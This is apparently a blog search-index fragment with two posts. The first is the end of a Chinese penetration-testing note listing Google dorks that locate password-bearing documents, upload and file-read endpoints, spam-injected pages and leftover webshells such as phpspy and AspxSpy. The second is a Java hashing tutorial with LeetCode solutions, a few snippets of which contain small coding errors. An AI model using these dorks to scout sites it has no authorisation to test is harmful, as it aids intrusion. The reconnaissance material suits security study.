intext:电话|手机号|联系方式|请拨打...\n\nOffice文档收集\nsite:example.com filetype:doc &quot;密码&quot;site:example.com filetype:xls|xlxs &quot;密码&quot;site:example.com filetype:doc intitle:&quot;管理&quot;\n\n功能性站点收集\n文件上传\nsite:example.com inurl:upload|upfile|saveup intext:提交|确定|上传\n文件下载\nsite:example.com inurl:download|downfile intext:下载\n文件读取\nsite:example.com inurl:&quot;path=&quot;|&quot;readfile=&quot;|&quot;file=&quot;|&quot;url=&quot;\n留言评论\nsite:example.com intext:提交|确定|评论\n个人空间（检查越权、存储型XSS）\nsite:example.com intext:个人信息管理|会员|个人空间 OR inurl:member|zone\n\n博彩、广告、反共言论查询\n其目的是被挂了博彩等页面的网站可能是被入侵过的，可以利用证据来搜寻相关利用漏洞\nsite:example.com intext:博彩|澳门|反共|色情|百家乐|轮盘|时时彩|荷官|香港彩|娱乐城|性爱|大陆|共匪|楼凤|外围|良家|一夜情|交友|上门服务site:example.com intext:裸聊|找小姐|返水|自拍|六合彩|同城交友|丝袜|少妇|小姐|狼友|桑拿|夜生活|真人娱乐|真钱|娱乐城|免费试玩|随时结算site:example.com intext:老虎机|真人娱乐|返点|德州扑克|棋牌|进入直播|游戏账号|&quot;VIP俱乐部&quot;|菠菜...\n一些语料库 https://github.com/RacerZ-fighting/1earn/blob/master/1earn/Security/RedTeam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98.md#%E8%AF%AD%E6%96%99%E6%94%B6%E9%9B%86\n\n历史遗留后门文件\n# 关键词查找site:example.com intext:剑眉大侠|不灭之魂|仗剑孤行|通杀版|法客论坛|上传的口令|&quot;导出DLL文件出错&quot;|&quot;token虚拟机管理&quot;|老子的绝对路径|免杀版site:example.com intext:法克|后门|木马|小马|大马|脱库|黑客|一句话后门|挂马|清马|&quot;扫描IP&quot;|开放端口|提权|执行命令|设置密码|提升权限site:example.com intext:一句话木马|过狗|安全狗|&quot;K8飞刀&quot;|&quot;K8拉登哥哥&quot;|&quot;K8搞基大队&quot;|反弹端口|&quot;hacked by&quot;...# 木马文件名查找site:example.com inurl:phpspy|udf|JFolder|JspSpyJDK5|AspxSpy2014Final...\n\n\n\n\nGithub信息搜集\n","tags":["渗透测试"]},{"title":"算法提升——哈希篇","url":"/2023/04/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0-%E5%93%88%E5%B8%8C%E7%AF%87%202c219ce944cb4603a432d4ae58b4fff5/","content":"数据结构复习-哈希篇\nHashMap 底层原理\n  由数组和哈希函数构成，后者计算出元素的索引存在对应数组的位置中。\n\n拉链法解决哈希冲突\n  当计算出来的索引相同时，即出现哈希冲突，就通过维护一个链表将所有同索引的元素（K, V 对）串起来\n\n\nleetcode-706 设计哈希映射\nclass MyHashMap &#123;    private class Pair &#123;        private int key;        private int val;        public Pair(int key, int val) &#123;            this.key = key;            this.val = val;        &#125;        public int getKey() &#123;            return key;        &#125;        public int getVal() &#123;            return val;        &#125;        public void setVal(int val) &#123;            this.val = val;        &#125;    &#125;    private LinkedList[] table;    public MyHashMap() &#123;        table = new LinkedList[759];        for (int i = 0; i &lt; table.length; i++) &#123;            table[i] = new LinkedList&lt;Pair&gt;();        &#125;    &#125;        public void put(int key, int value) &#123;        LinkedList&lt;Pair&gt; p = table[hash(key)];        Iterator&lt;Pair&gt; iter = p.iterator();        while (iter.hasNext()) &#123;            Pair entry = iter.next();            if (entry.getKey() == key) &#123;                entry.setVal(value);                return;            &#125;        &#125;        p.addLast(new Pair(key, value));    &#125;        public int get(int key) &#123;        LinkedList&lt;Pair&gt; p = table[hash(key)];        Iterator&lt;Pair&gt; iter = p.iterator();        while (iter.hasNext()) &#123;            Pair entry = iter.next();            if (entry.getKey() == key) &#123;                return entry.getVal();            &#125;        &#125;                return -1;    &#125;        public void remove(int key) &#123;        LinkedList&lt;Pair&gt; p = table[hash(key)];        Iterator&lt;Pair&gt; iter = p.iterator();        while (iter.hasNext()) &#123;            Pair entry = iter.next();            if (entry.getKey() == key) &#123;                p.remove(entry);                return;            &#125;        &#125;    &#125;    private int hash(int key) &#123;        return key % table.length;    &#125;&#125;/** * Your MyHashMap object will be instantiated and called as such: * MyHashMap obj = new MyHashMap(); * obj.put(key,value); * int param_2 = obj.get(key); * obj.remove(key); */\n\n\n\n线性探查法解决哈希冲突\n  当哈希计算得到的索引已被其他元素占有时，就线性后移直至找到一个空位置插入元素（移到最后一个元素的话就重新从第一个元素开始）\n\n  import java.util.LinkedList;import java.util.List;import java.util.Map;public class MyHashMap23&lt;K, V&gt; &#123;    private static class Node&lt;K, V&gt; implements Map.Entry&lt;K, V&gt; &#123;        K key;        V val;        Node(K key, V val) &#123;            this.key = key;            this.val = val;        &#125;        @Override        public K getKey() &#123;            return key;        &#125;        @Override        public V getValue() &#123;            return val;        &#125;        @Override        public V setValue(V val) &#123;            V oldVal = this.val;            this.val = val;            return oldVal;        &#125;    &#125;    // 真正存储键值对的数组    private Node&lt;K, V&gt;[] table;    // HashMap 中的键值对个数    private int size;    // HashMap 的容量，即 keys 和 vals 的 length    private int cap;    // 默认的初始化容量    private static final int INIT_CAP = 4;    public MyHashMap23() &#123;        this(INIT_CAP);    &#125;    public MyHashMap23(int initCapacity) &#123;        size = 0;        cap = initCapacity;        table = (Node&lt;K, V&gt;[]) new Node[initCapacity];    &#125;    /***** 增/改 *****/    // 添加 key -&gt; val 键值对    // 如果键 key 已存在，则将值修改为 val    public V put(K key, V val) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        if (size &gt;= cap / 2) &#123;            resize(cap * 2);        &#125;        int i = getNodeIndex(key);        // key 已存在，修改对应的 val        if (i != -1) &#123;            Node&lt;K, V&gt; entry = table[i];            V oldVal = entry.val;            entry.val = val;            return oldVal;        &#125;        // key 不存在，找个空位插入        i = hash(key);        while (table[i] != null) &#123;            i = (i + 1) % cap;        &#125;        // 此时 table[i] 为一个空位        Node&lt;K, V&gt; x = new Node&lt;&gt;(key, val);        table[i] = x;        size++;        return null;    &#125;    /***** 删 *****/    // 删除 key 和对应的 val，并返回 val    // 若 key 不存在，则返回 null    public V remove(K key) &#123;\t    // TODO    &#125;    /***** 查 *****/    // 返回 key 对应的 val    // 如果 key 不存在，则返回 null    public V get(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        int i = getNodeIndex(key);        if (i == -1) &#123;            return null;        &#125;        return table[i].val;    &#125;    // 判断 key 是否存在 Map 中    public boolean containsKey(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        return getNodeIndex(key) != -1;    &#125;    /***** 其他工具函数 *****/    public List&lt;K&gt; keys() &#123;        LinkedList&lt;K&gt; keyList = new LinkedList&lt;&gt;();        for (Node&lt;K, V&gt; entry : table) &#123;            if (entry != null) &#123;                keyList.addLast(entry.key);            &#125;        &#125;        return keyList;    &#125;    public List&lt;Map.Entry&lt;K, V&gt;&gt; entries() &#123;        LinkedList&lt;Map.Entry&lt;K, V&gt;&gt; entryList = new LinkedList&lt;&gt;();        for (Node&lt;K, V&gt; entry : table) &#123;            if (entry != null) &#123;                entryList.addLast(entry);            &#125;        &#125;        return entryList;    &#125;    public int size() &#123;        return size;    &#125;    public boolean isEmpty() &#123;        return size == 0;    &#125;    // 哈希函数，将键映射到 table 的索引    // [0, table.length - 1]    private int hash(K key) &#123;        // int: 0000 0000 0000 ... 0000        //    : 0111 1111 1111 ... 1111        return (key.hashCode() &amp; 0x7fffffff) % cap;    &#125;    // 对 key 进行线性探查，返回一个索引    // 若返回 -1 说明没有找到    private int getNodeIndex(K key) &#123;        int i;        for (i = hash(key); table[i] != null; i = (i + 1) % cap) &#123;            if (table[i].key.equals(key))                return i;        &#125;        return -1;    &#125;    private void resize(int newCap) &#123;        MyHashMap23&lt;K, V&gt; newMap = new MyHashMap23&lt;&gt;(newCap);        for (Node&lt;K, V&gt; entry : table) &#123;            if (entry != null) &#123;                newMap.put(entry.key, entry.val);            &#125;        &#125;        this.table = newMap.table;        this.cap = newMap.cap;    &#125;&#125;\n  细节在于如何处理 remove() 方法，这里有两种思路：\n\n将删除元素置空，并且为了防止后面哈希冲突元素无法被探查的，也需要将它们一并置空并重新放入，put() 方法将会把他们放在正确的位置\n public V remove(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        if (size &lt; cap / 8) &#123;            resize(cap / 2);        &#125;        int i = getNodeIndex(key);        if (i == -1) &#123;            // key 不存在，不需要 remove            return null;        &#125;        // 开始 remove        V deletedVal = table[i].val;        table[i] = null;        size--;        // 保持连续性        i = (i + 1) % cap;        for (; table[i] != null; i = (i + 1) % cap) &#123;            Node&lt;K, V&gt; entry = table[i];            table[i] = null;            // put 里面又会加一            size--;            put(entry.key, entry.val);        &#125;        return deletedVal;    &#125;\n\n删除结点时不置空，而是做一个特殊标记，来保证哈希冲突元素的连续性\n 特殊标志可由如下 dummy 表示\n private final Node&lt;K, V&gt; DUMMY = new Node&lt;&gt;(null, null);\n public V remove(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        if (size &lt; cap / 8) &#123;            resize(cap / 2);        &#125;        int i = getNodeIndex(key);        if (i == -1) &#123;            // key 不存在，不需要 remove            return null;        &#125;        // 开始 remove        V deletedVal = tables[i].val;        // 直接用占位符表示删除        tables[i] = DUMMY;        size--;        return deletedVal;    &#125;\n import java.util.LinkedList;import java.util.List;import java.util.Map;public class MyHashMap24&lt;K, V&gt; &#123;    private static class Node&lt;K, V&gt; implements Map.Entry&lt;K, V&gt; &#123;        K key;        V val;        Node(K key, V val) &#123;            this.key = key;            this.val = val;        &#125;        @Override        public K getKey() &#123;            return key;        &#125;        @Override        public V getValue() &#123;            return val;        &#125;        @Override        public V setValue(V val) &#123;            V oldVal = this.val;            this.val = val;            return oldVal;        &#125;    &#125;    // TODO: 被删除的 Node 的占位符    private final Node&lt;K, V&gt; DUMMY = new Node&lt;&gt;(null, null);    // 真正存储键值对的数组    private Node&lt;K, V&gt;[] tables;    // HashMap 中的键值对个数    private int size;    // HashMap 的容量，即 keys 和 vals 的 length    private int cap;    // 默认的初始化容量    private static final int INIT_CAP = 4;    public MyHashMap24() &#123;        this(INIT_CAP);    &#125;    public MyHashMap24(int initCapacity) &#123;        size = 0;        cap = initCapacity;        tables = (Node&lt;K, V&gt;[]) new Node[initCapacity];    &#125;    /***** 增/改 *****/    // 添加 key -&gt; val 键值对    // 如果键 key 已存在，则将值修改为 val    public V put(K key, V val) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        if (size &gt;= cap / 2) &#123;            resize(cap * 2);        &#125;        int i = getNodeIndex(key);        if (i != -1) &#123;            // key 已存在，修改对应的 val            Node&lt;K, V&gt; entry = tables[i];            if (entry != null) &#123;                V oldVal = entry.val;                entry.val = val;                return oldVal;            &#125;        &#125;        // key 不存在，插入        Node&lt;K, V&gt; x = new Node&lt;&gt;(key, val);        // 在 table 中找一个空位或者占位符        i = hash(key);        // 不仅找空的，还可以找占位符        while (tables[i] != null &amp;&amp; tables[i] != DUMMY) &#123;            i = (i + 1) % cap;        &#125;        tables[i] = x;        size++;        return null;    &#125;    /***** 删 *****/    // 删除 key 和对应的 val，并返回 val    // 若 key 不存在，则返回 null    public V remove(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        if (size &lt; cap / 8) &#123;            resize(cap / 2);        &#125;        int i = getNodeIndex(key);        if (i == -1) &#123;            // key 不存在，不需要 remove            return null;        &#125;        // 开始 remove        V deletedVal = tables[i].val;        // 直接用占位符表示删除        tables[i] = DUMMY;        size--;        return deletedVal;    &#125;    /***** 查 *****/    // 返回 key 对应的 val    // 如果 key 不存在，则返回 null    public V get(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        int i = getNodeIndex(key);        if (i == -1) &#123;            return null;        &#125;        return tables[i].val;    &#125;    // 判断 key 是否存在 Map 中    public boolean containsKey(K key) &#123;        if (key == null) &#123;            throw new IllegalArgumentException(&quot;key is null&quot;);        &#125;        int i = getNodeIndex(key);        return i != -1;    &#125;    // 对 key 进行线性探查，返回一个索引    // 根据 keys[i] 是否为 null 判断是否找到对应的 key    private int getNodeIndex(K key) &#123;        int i;        int step = 0;        for (i = hash(key); tables[i] != null; i = (i + 1) % cap) &#123;            Node&lt;K, V&gt; p = tables[i];            // TODO:遇到占位符直接跳过            if (p == DUMMY) &#123;                continue;            &#125;            if (p.key.equals(key)) &#123;                return i;            &#125;            step++;            // TODO: 防止死循环            if (step == tables.length) &#123;                resize(cap);                return -1;            &#125;        &#125;        return -1;    &#125;    public int size() &#123;        return size;    &#125;    public boolean isEmpty() &#123;        return size == 0;    &#125;    public List&lt;K&gt; keys() &#123;        LinkedList&lt;K&gt; keyList = new LinkedList&lt;&gt;();        for (Node&lt;K, V&gt; entry : tables) &#123;            if (entry != null) &#123;                keyList.addLast(entry.key);            &#125;        &#125;        return keyList;    &#125;    public List&lt;Map.Entry&lt;K, V&gt;&gt; entries() &#123;        LinkedList&lt;Map.Entry&lt;K, V&gt;&gt; entryList = new LinkedList&lt;&gt;();        for (Node&lt;K, V&gt; entry : tables) &#123;            if (entry != null) &#123;                entryList.addLast(entry);            &#125;        &#125;        return entryList;    &#125;    // 哈希函数，将键映射到 table 的索引    // [0, table.length - 1]    private int hash(K key) &#123;        // int: 0000 0000 0000 ... 0000        //    : 0111 1111 1111 ... 1111        return (key.hashCode() &amp; 0x7fffffff) % cap;    &#125;    private void resize(int newCap) &#123;        MyHashMap24&lt;K, V&gt; newMap = new MyHashMap24&lt;&gt;(newCap);        for (Node&lt;K, V&gt; entry : tables) &#123;            if (entry != null &amp;&amp; entry != DUMMY) &#123;                newMap.put(entry.key, entry.val);            &#125;        &#125;        this.tables = newMap.tables;        this.cap = newMap.cap;    &#125;&#125;\n\n\n\n\n\nHashSet 底层原理\n  底层就是 HashMap, 复用的是它的键，因为键是唯一的（哈希冲突解决）。值直接用 dummy 作占位符即可\n  import java.util.HashMap;public class MyHashSet&lt;K&gt; &#123;    // val 占位符    private static final Object PRESENT = new Object();    // 底层 HashMap    private final HashMap&lt;K, Object&gt; map = new HashMap&lt;&gt;();    public boolean add(K k) &#123;        return map.put(k, PRESENT) == null;    &#125;    public boolean remove(K k) &#123;        return map.remove(k) == PRESENT;    &#125;    public boolean contains(K k) &#123;        return map.containsKey(k);    &#125;    public int size() &#123;        return map.size();    &#125;    public boolean isEmpty() &#123;        return map.isEmpty();    &#125;\n\n应用\n\nleetcode-1 两数之和\n  首先，可以沿用之前双指针 + 维护索引的方法，即索引保存后数组排序，利用双指针扫描；麻烦点就在于可能出现相同的元素，这种情况 HashMap 无能为力，因此只能自己维护一个数据结构。这里的另一个思路就是直接保存值和索引映射在 HashMap 当中，边查边存，找 need = target - num。 对于两数之和肯定不会撞上。\n  public int[] twoSum(int[] nums, int target) &#123;        HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();        for (int i = 0; i &lt; nums.length; i++) &#123;            int need = target - nums[i];            if (map.containsKey(need)) &#123;                return new int[] &#123;map.get(need), i&#125;;            &#125;            map.put(nums[i], i);        &#125;        return null;    &#125;\n\nleetcode-138 复制带随机指针的链表\n  这题考察点在深拷贝，可以利用 HashMap 来维护原结点和新结点的映射\n  public Node copyRandomList(Node head) &#123;        HashMap&lt;Node, Node&gt; map = new HashMap&lt;&gt;();        for (Node p = head; p != null; p = p.next) &#123;            map.put(p, new Node(p.val));        &#125;                for (Node p = head; p != null; p = p.next) &#123;            Node tmp = map.get(p);            if (p.next != null) &#123;                tmp.next = map.get(p.next);            &#125;            if (p.random != null) &#123;                tmp.random = map.get(p.random);            &#125;        &#125;        return map.get(head);    &#125;\n\nleetcode-242 有效的字母异位词\n  作字符统计再比较即可\n  class Solution &#123;    public boolean isAnagram(String s, String t) &#123;        int[] count1 = encodes(s);        int[] count2 = encodes(t);        for (int i =  0; i &lt; count1.length; i++) &#123;            if (count1[i] != count2[i]) &#123;                return false;            &#125;        &#125;        return true;    &#125;    private int[] encodes(String s) &#123;        int[] count = new int[26];        for (char c : s.toCharArray()) &#123;            count[c - &#x27;a&#x27;]++;        &#125;        return count;    &#125;&#125;\n\nleetcode-49 字母异位词分组\n  这里利用 HashMap 来维护相同字符编码到字符串集合也就是字母异位词的映射，这里对于字符编码需要额外的处理，为了保证可比较，所以最后还是得转换为字符串的形式，需要计数的时候直接用 char[] \n  class Solution &#123;    public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;        HashMap&lt;String, List&lt;String&gt;&gt; map = new HashMap&lt;&gt;();        for (String str : strs) &#123;            // 得到每个字符串的编码值            String count = encode(str);            // 已存在的不执行            map.putIfAbsent(count, new LinkedList&lt;String&gt;());            map.get(count).add(str);        &#125;        LinkedList&lt;List&lt;String&gt;&gt; res = new LinkedList&lt;&gt;();        for (List&lt;String&gt; value : map.values()) &#123;            res.addLast(value);        &#125;        return res;    &#125;    // 需要做一些改造    private String encode(String s) &#123;        char[] count = new char[26];        for (char c : s.toCharArray()) &#123;            count[c - &#x27;a&#x27;]++;        &#125;        return new String(count);    &#125;&#125;\n\nleetcode-387 字符串中的第一个唯一字符\n  HashMap 维护字符计数即可，寻找第一个字符计数为 1 的索引值\n  class Solution &#123;    public int firstUniqChar(String s) &#123;        int[] count = encode(s);        char[] p = s.toCharArray();        for (int i = 0; i &lt; p.length; i++) &#123;            if (count[p[i] - &#x27;a&#x27;] == 1) &#123;                return i;            &#125;        &#125;                return -1;    &#125;    private int[] encode(String s) &#123;        int[] count = new int[26];        for (char c : s.toCharArray()) &#123;            count[c - &#x27;a&#x27;]++;        &#125;        return count;    &#125;&#125;\n\nleetcode-169 多数元素\n  这里可以不采用 HashMap 计数的方式，因为待求众数数量是大于一半的，因此联想正负电性混合起来的现象，采用 count 去吸引出众数也就是代表正电性的元素，最终该元素一定是使得 count 大于 0 的\n  public int majorityElement(int[] nums) &#123;        int count = 0;        int target = 0;        for (int i = 0; i &lt; nums.length; i++) &#123;            if (count == 0) &#123;                target = nums[i];                count++;            &#125; else if (target == nums[i]) &#123;                count++;            &#125; else &#123;                count--;            &#125;        &#125;        return target;    &#125;\n\nleetcode-389 找不同\n\n常规哈希表做法，统计字符出现次数即可\n class Solution &#123;    public char findTheDifference(String s, String t) &#123;        int[] count1 = encode(s);        int[] count2 = encode(t);        for (int i = 0; i &lt; 26; i++) &#123;            if (count1[i] != count2[i]) &#123;                return (char) (i + &#x27;a&#x27;);            &#125;        &#125;        return &#x27; &#x27;;    &#125;    private int[] encode(String s) &#123;        int[] count = new int[26];        for (char c : s.toCharArray()) &#123;            count[c - &#x27;a&#x27;]++;        &#125;        return count;    &#125;&#125;\n\n位运算法，将两个字符串逐位异或起来，最终的结果一定是新添加的字母\n public char findTheDifference(String s, String t) &#123;        int res = 0;        for (char c : s.toCharArray()) &#123;            res = res ^ c;         &#125;        for (char c : t.toCharArray()) &#123;            res = res ^ c;        &#125;        return (char) res;    &#125;\n\n\n\nleetcode-442 数组中重复的数据\n  这题有个巧妙的做法，审题可以发现“长度为 n 的整数数组 nums ，其中 nums  的所有整数都在范围 [1, n] 内”，也就是说 nums 数组本身就可以看作是哈希表，其元素和索引存在着某种映射关系，对于出现两次的元素，其如果看作索引的话，一定会映射到相同的值上。因此可以对第一次出现的元素做个标记，在第二次检查标记\n  PS：注意这里做标记是乘 -1，因为元素值均为正数，但是放在索引上时记得取绝对值方式负数越界\n  public List&lt;Integer&gt; findDuplicates(int[] nums) &#123;        LinkedList&lt;Integer&gt; res = new LinkedList&lt;&gt;();        for (int num : nums) &#123;            if (nums[Math.abs(num) - 1] &gt; 0) &#123;                // 第一次出现                nums[Math.abs(num) - 1] *= -1;            &#125; else if (nums[Math.abs(num) - 1] &lt; 0) &#123;                res.add(Math.abs(num));            &#125;        &#125;        return res;    &#125;\n\nleetcode-448 找到所有数组中消失的数字\n  这题可以沿用上题的思路，标记所有出现过的元素（依然用 nums 自身做映射），对于没标记过的元素，就返回它的索引值 i + 1 ，也就是未出现过的数字\n  public List&lt;Integer&gt; findDisappearedNumbers(int[] nums) &#123;        LinkedList&lt;Integer&gt; res = new LinkedList&lt;&gt;();        for (int num : nums) &#123;            if (nums[Math.abs(num) - 1] &gt; 0) &#123;                nums[Math.abs(num) - 1] *= -1;            &#125; else &#123;                continue;            &#125;        &#125;        for (int i = 0; i &lt; nums.length; i++) &#123;            if (nums[i] &gt; 0) &#123;                res.add(i + 1);            &#125;        &#125;        return res;    &#125;\n\n\n\nLinkedHashMap\n  特性：可以顺序访问所有 key\n  为什么 HashMap 无序？源于 hash 输出的随机性\n\nLinkedHashMap 原理\n  多增加一个 LinkedList 来存储元素插入顺序\n\n  这里在删除元素时就会增加时间复杂度，因为链表本身需要先遍历索引找到对应的待删除节点。如果想以 O(1) 时间删除元素，则 HashMap 应改为维护索引到节点的映射\n\nLinkedHashMap 实现\n  import java.util.HashMap;import java.util.LinkedList;public class MyLinkedHashMap&lt;K, V&gt; &#123;    private HashMap&lt;K, Node&lt;K, V&gt;&gt; map = new HashMap&lt;&gt;();    public MyLinkedHashMap() &#123;\t\t\t\t// dummy Node        head = new Node&lt;&gt;(null, null);        tail = new Node&lt;&gt;(null, null);        head.next = tail;        tail.prev = head;    &#125;    public V get(K key) &#123;        Node&lt;K, V&gt; x = map.get(key);        if (x != null) &#123;            return x.val;        &#125;        return null;    &#125;    public V put(K key, V val) &#123;        // 若为新插入的节点，则同时插入链表和 map        if (!map.containsKey(key)) &#123;            // 插入新的 Node            Node&lt;K, V&gt; x = new Node&lt;&gt;(key, val);            addLastNode(x);            map.put(key, x);            return null;        &#125;        // 若存在，则替换之前的 val        Node&lt;K, V&gt; x = map.get(key);        V oldVal = x.val;        x.val = val;        return oldVal;    &#125;    public V remove(K key) &#123;        // 若 key 本不存在，直接返回        if (!map.containsKey(key)) &#123;            return null;        &#125;        // 若 key 存在，则需要在链表中也删除        Node&lt;K,V&gt; x = map.remove(key);        removeNode(x);        return x.val;    &#125;    public boolean containsKey(K key) &#123;        return map.containsKey(key);    &#125;    public Iterable&lt;K&gt; keys() &#123;        LinkedList&lt;K&gt; keyList = new LinkedList&lt;&gt;();        for (Node&lt;K, V&gt; p = head.next; p != tail; p = p.next) &#123;            keyList.addLast(p.key);        &#125;        return keyList;    &#125;    public int size() &#123;        return map.size();    &#125;    public boolean isEmpty() &#123;        return map.isEmpty();    &#125;    private static class Node&lt;K, V&gt; &#123;        K key;        V val;        Node&lt;K, V&gt; next, prev;        Node(K key, V val) &#123;            this.key = key;            this.val = val;        &#125;    &#125;    private final Node&lt;K, V&gt; head, tail;    private void addLastNode(Node&lt;K, V&gt; x) &#123;        Node&lt;K, V&gt; temp = tail.prev;        // temp &lt;-&gt; tail        x.next = tail;        x.prev = temp;        temp.next = x;        tail.prev = x;    &#125;    private void removeNode(Node&lt;K, V&gt; x) &#123;        Node&lt;K, V&gt; prev = x.prev;        Node&lt;K, V&gt; next = x.next;        // prev &lt;-&gt; x &lt;-&gt; next        prev.next = next;        next.prev = prev;        x.next = x.prev = null;    &#125;&#125;\n\n\n\nArrayHashMap\n  特性：可在 O(1) 时间内等概率随机返回一个 key\n  标准 HashMap 中的 table 数组是无法提供一个随机 pop 方法的，因为其中存储元素并非都是有效（如线性探查法不是顺序存储元素的）\n\n原理 与 ArrayList 结合\n  与 LinkedHashMap 类似，底层 HashMap 保存 key 到数组索引的映射\n  这里删除元素比较有意思，由于数组中间删除元素一定会设计元素的搬移，但是删除数组尾部元素就不需要，因此我们可以先将待删除元素和尾部元素作交换，然后在把它删掉，最后重新更新 HashMap 的索引映射即可\n\n\nArrayHashMap 实现\n  import java.util.Random;public class MyArrayHashMap&lt;K, V&gt; &#123;    private static class Node&lt;K, V&gt; &#123;        K key;        V val;        Node(K key, V val) &#123;            this.key = key;            this.val = val;        &#125;    &#125;\t\t// key =&gt; index    private final HashMap&lt;K, Integer&gt; map = new HashMap&lt;&gt;();\t\t// Node List    private final MyArrayList&lt;Node&lt;K, V&gt;&gt; arr = new MyArrayList&lt;&gt;();    private final Random r = new Random();    public MyArrayHashMap() &#123;    &#125;    public V get(K key) &#123;        if (!map.containsKey(key)) &#123;            return null;        &#125;        // 获取 key 在 map 中的索引        int i = map.get(key);        return arr.get(i).val;    &#125;    public V put(K key, V val) &#123;        if (containsKey(key)) &#123;            // 修改            int i = map.get(key);            Node&lt;K, V&gt; x = arr.get(i);            V oldVal = x.val;            x.val = val;            return oldVal;        &#125;        // 新增        Node&lt;K, V&gt; x = new Node&lt;&gt;(key, val);        arr.addLast(x);        map.put(key, arr.size() - 1);        return null;    &#125;    public V remove(K key) &#123;        if (!map.containsKey(key)) &#123;            return null;        &#125;        int index = map.get(key);        Node&lt;K, V&gt; x = arr.get(i);        // 1. 最后一个元素 e 和第 i 个元素 x 换位置        Node&lt;K, V&gt; e = arr.get(arr.size() - 1);        arr.set(index, e);        arr.set(arr.size() - 1, x);        // 2. 修改 map 中 e.key 对应的索引        map.put(e.key, index);        // 3. 在数组中 removeLast        arr.removeLast();        // 4. 在 map 中 remove x.key        map.remove(x.key);        return x.val;    &#125;    // 随机弹出一个键    public K pop() &#123;        int n = arr.size();\t\t\t\t// [0, n-1]        int randomIndex = r.nextInt(n);        return arr.get(randomIndex).key;    &#125;    public boolean containsKey(K key) &#123;        return map.containsKey(key);    &#125;    public int size() &#123;        return map.size();    &#125;    public boolean isEmpty() &#123;        return map.isEmpty();    &#125;    public static void main(String[] args) &#123;        MyArrayHashMap&lt;Integer, Integer&gt; map = new MyArrayHashMap&lt;&gt;();        map.put(2, 1);        map.put(2, 2);        System.out.println(map.get(2));    &#125;&#125;\n\n\n\nLRU 缓存淘汰算法\n  其解决的问题是由于缓存容量有限，当有新内容到来时需要选择清理掉一部分内容为新的内容腾地方，LRU 采取的策略是最近使用的原则，即最久未使用的就是待清除的。\n  💡leetcode-146 LRU 缓存\n\n条件分析\n  要想满足该 cache 数据结构的条件，使得 put 和 get 均在 O(1) 的时间复杂度下运行，则有如下条件：\n\n1、显然 cache 中的元素必须有时序，以区分最近使用的和久未使用的数据，当容量满了之后要删除最久未使用的那个元素腾位置。\n2、我们要在 cache 中快速找某个 key 是否已存在并得到对应的 val；\n3、每次访问 cache 中的某个 key，需要将这个元素变为最近使用的，也就是说 cache 要支持在任意位置快速插入和删除元素。\n\n  联想之前学的可知 LinkedHashMap 满足此条件，结合 HashMap 的快速查找属性以及 LinkedList 的快速插入和删除元素的特性\n\n代码实现\n  这里对于 put 方法流程如下：\n\n\nJava Code\n  package top.john.base;import java.util.HashMap;public class LRU &#123;    // key -&gt; Node(key, val)    private HashMap&lt;Integer, Node&gt; map;    // Node(k1, v1) &lt;-&gt; Node(k2, v2)...    private DoubleList cache;    private int cap;    public LRU(int cap) &#123;        this.cap = cap;        map = new HashMap&lt;&gt;();        cache = new DoubleList();    &#125;    public int get(int key) &#123;        if (!map.containsKey(key)) &#123;            return -1;        &#125;        // 变成最近使用的        makeRecently(key);        return map.get(key).val;    &#125;    public void put(int key, int val) &#123;        if (map.containsKey(key)) &#123;            deleteKey(key);            addRecently(key, val);            return;        &#125;        if (cap == cache.size()) &#123;            removeRecently();        &#125;        addRecently(key, val);    &#125;    // 将某个 key 变为最近使用的    private void makeRecently(int key) &#123;        Node x = map.get(key);        cache.remove(x);        cache.addLast(x);    &#125;    // 添加最近使用的元素    private void addRecently(int key, int val) &#123;        Node x = new Node(key, val);        cache.addLast(x);        map.put(key, x);    &#125;    // 删除某一个 key    private void deleteKey(int key) &#123;        Node x = map.get(key);        cache.remove(x);        map.remove(key);    &#125;    // 删除最久未使用的元素    private void removeRecently() &#123;        Node del = cache.removeFirst();        int delKey = del.key;        map.remove(delKey);    &#125;&#125;class DoubleList &#123;    // dummy    private Node head, tail;    // nums    private int size;    public DoubleList() &#123;        head = new Node(0, 0);        tail = new Node(0, 0);        head.next = tail;        tail.prev = head;        size = 0;    &#125;    // addLast O(1)    public  void addLast(Node x) &#123;        x.prev = tail.prev;        x.next = tail;        tail.prev.next = x;        tail.prev = x;        size++;    &#125;    public void remove(Node x) &#123;        x.prev.next = x.next;        x.next.prev = x.prev;        size--;    &#125;    public Node removeFirst() &#123;        if (head.next == tail) &#123;            return null;        &#125;        Node first = head.next;        remove(first);        return first;    &#125;    public int size() &#123;        return size;    &#125;&#125;class Node &#123;    public int key, val;    public Node next, prev;    public Node(int key, int val) &#123;        this.key = key;        this.val = val;    &#125;&#125;\n  底层直接用 LinkedHashMap 的实现\n  class LRUCache &#123;    private int cap;    private LinkedHashMap&lt;Integer, Integer&gt; cache;    public LRUCache(int capacity) &#123;        cache = new LinkedHashMap&lt;&gt;();        cap = capacity;    &#125;        public int get(int key) &#123;        if (!cache.containsKey(key)) &#123;            return -1;        &#125;        int val  = cache.get(key);        makeRecently(key);        return val;    &#125;        public void put(int key, int value) &#123;        if (cache.containsKey(key)) &#123;\t\t\t\t\t\t// 直接跳整顺序并修改即可            makeRecently(key);            cache.put(key, value);            return;        &#125;        if (cache.size() &gt;= cap) &#123;\t\t\t\t\t\t// 找到迭代器的第一个结点，即最久未使用的元素           int del  = cache.keySet().iterator().next();           cache.remove(del);        &#125;        cache.put(key, value);    &#125;\t\t// 用于调整元素在链表中的顺序    private void makeRecently(int key) &#123;        int val = cache.get(key);        cache.remove(key);        cache.put(key, val);    